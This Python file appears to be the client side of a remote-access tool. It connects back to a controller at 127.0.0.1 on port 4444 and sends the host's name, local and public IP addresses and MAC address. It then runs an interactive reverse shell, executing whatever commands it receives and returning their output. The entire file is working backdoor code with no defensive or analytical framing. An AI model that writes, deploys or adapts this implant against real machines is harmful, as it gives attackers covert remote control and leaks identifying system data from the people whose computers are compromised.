import platform
import socket
import sys
import urllib.request
import json
import uuid
import struct
import subprocess
import os


IP = "127.0.0.1"
PORT = 4444
ARC = platform.system()

def send(sock, data):
    if isinstance(data, str):
        data = data.encode()
    data_size = len(data)
    sock.sendall(struct.pack('>I', data_size)) 
    sock.sendall(data) 

def recv(sock):
    data_size = recvall(sock, 4)  
    if not data_size:
        return None 
    data_len = struct.unpack(">I", data_size)[0]  
    return recvall(sock, data_len)

def recvall(sock, n):
    packet = b'' 
    while len(packet) < n:
        frame = sock.recv(n - len(packet))  
        if not frame:
            return None  
        packet += frame  
    return packet  


def get_ip_info(sock):
        try:
            lip = str(socket.gethostbyname(socket.gethostname()))
            res = urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3)
            data = json.loads(res.read().decode())
            pip = data.get('ip', 'Unknown')
            ips = {
                "pip": pip,
                "lip": lip
            }
            output = json.dumps(ips).encode()
            send(sock, output)
        except Exception as e:
            print(f"Error IP info: {e}") 
    
def kill_connection(sock):
        sock.close()
        sys.exit()

def handle_shell(sock):
    curr_dir = os.getcwd() # not necessary

    while True:
        cmd = recv(sock).decode()
        if cmd == "exit_shell":
            break
        try:
            if cmd.startswith("cd "):
                dir = cmd[3:]
                if not os.path.isdir(dir):
                    send(sock, f"$ No such directory {dir}\n".encode())
                    send(sock, b"END_OF_OUTPUT")
                    continue
                os.chdir(dir)
                send(sock, f"$ {str(os.getcwd())}\n".encode())
                send(sock, b"END_OF_OUTPUT")
                continue
            else:
                proc = subprocess.Popen(
                    cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
                for line in proc.stdout:
                    send(sock, line)
                send(sock, b"END_OF_OUTPUT")      
        except Exception as e:
            send(sock, f"Error: {str(e)}".encode())
            send(sock, b"END_OF_OUTPUT")

def handle_cmd(sock):
    try:
        while True:
            cmd = recv(sock).decode()
            if not cmd or cmd == None:
                continue
            try:
                if cmd == "getip":
                    get_ip_info(sock)
                
                elif cmd == "shell":
                    handle_shell(sock)
                    
                elif cmd.lower() == "kill":
                    kill_connection(sock)
                    
                else:
                    response = f"Received cmd: {cmd}"
                    print(response)
            except socket.error as e:
                print(f"Error cmd: {e}")
                sock.close()
                sys.exit(0)
                break
                
    except Exception as e:
        print(f"\nCommand handler error: {e}")
        sock.close()
        sys.exit(0)

def gsi():
        try:
            hn = platform.node()
            lip = str(socket.gethostbyname(socket.gethostname()))
            m = uuid.getnode()
            mc = ':'.join(['{:02x}'.format((m >> ele) & 0xff) for ele in range(40, -1, -8)])
            output = {
                "lip": lip,
                "hname": hn,
                "mac": mc
            }
            return json.dumps(output).encode()
        except Exception as e:
            return f"Error getting info: {e}".encode()
        

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, PORT))
        info = gsi()
        send(sock, info)
        print("Connected to server...")

        handle_cmd(sock)

    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)

if __name__ == "__main__":
    main()
